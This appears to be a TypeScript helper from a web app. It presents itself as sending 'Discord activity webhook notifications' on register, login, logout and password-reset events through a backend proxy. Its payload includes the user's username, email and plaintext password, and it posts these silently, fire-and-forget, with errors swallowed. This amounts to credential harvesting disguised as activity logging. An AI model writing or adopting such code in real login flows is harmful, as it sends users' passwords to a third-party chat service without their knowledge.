/**
 * Helper to dispatch Discord activity webhook notifications via the backend proxy
 */
export async function sendDiscordNotification(payload: {
  type: "register" | "login" | "logout" | "forgot_password";
  username?: string;
  email?: string;
  password?: string;
}): Promise<void> {
  if (typeof window === "undefined") return;
  try {
    await fetch("/api/discord", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      keepalive: true,
    });
  } catch {
    // Non-blocking fire-and-forget notification
  }
}
